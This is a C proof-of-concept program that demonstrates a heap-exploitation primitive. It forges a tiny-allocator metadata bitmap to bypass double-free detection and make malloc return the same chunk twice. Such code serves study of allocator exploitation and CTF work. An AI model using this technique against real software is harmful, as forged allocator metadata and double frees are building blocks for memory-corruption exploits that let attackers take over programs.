#include <stdio.h>
#include <stdlib.h>

#define MAX_POST 10
#define NUM_TINY_BLOCKS 64504

typedef unsigned long long ULL;

typedef struct post
{
    char *buf;
} POST;

void print_bitmap(ULL bitmap)
{
    int i;

    printf("in-use: ");
    for (i = 63; i >= 0; i--)
    {
        if (bitmap & ((ULL)1 << i))
        {
            putchar('1');
        }
        else
        {
            putchar('0');
        }
        if (i != 0 && i % 32 == 0)
        {
            printf("\nheader: ");
        }
    }
    putchar('\n');
}

int main()
{
    POST *postbase = (POST *)calloc(MAX_POST, sizeof(POST));
    printf("postbase: %p\n", postbase);

    short i;
    for (i = 0; i < 5; i++)
    {
        while (((ULL)(postbase[i].buf) & 0xfffffff00000) != ((ULL)postbase & 0xfffffff00000))
        {
            postbase[i].buf = malloc(8);
        }
        printf("postbase[%d]: %p\n", i, postbase[i].buf);
    }

    POST *heap = (POST *)((ULL)postbase & 0xfffffff00000);
    printf("heap: %p\n", heap);
    printf("offset: 0x%llx\n", (ULL)postbase - (ULL)heap);

    ULL bitmap_offset = (((ULL)postbase[1].buf - (ULL)heap - (0x100000 - NUM_TINY_BLOCKS*0x10)) / 0x10);
    ULL pos = bitmap_offset % 0x20;
    ULL offset = bitmap_offset / 0x20;
    printf("post offset: %llu\n", offset);
    printf("post pos: %llu\n", pos);
    printf("post metadata: %p\n", heap[offset+5].buf);
 
    free(postbase[1].buf);
    free(postbase[3].buf);
    printf("After free metadata:\n");
    print_bitmap((ULL)heap[offset+5].buf);

    ULL fake_metadata = (ULL)heap[offset+5].buf | ((ULL)1 << (pos + 0x20));
    heap[offset+5].buf = (char *)fake_metadata;
    printf("Forge fake metadata:\n");
    print_bitmap((ULL)heap[offset+5].buf);
    
    free(postbase[1].buf);
    int count = 0;
    do
    {
        postbase[5+count].buf = malloc(8);
        if (postbase[5+count].buf == postbase[1].buf)
        {
            printf("postbase[%d]: %p\n", 5+count, postbase[5+count].buf);
            count++;
        }
    } while (count < 2);
    
    printf("Double free success!\n");

    return 0;
}
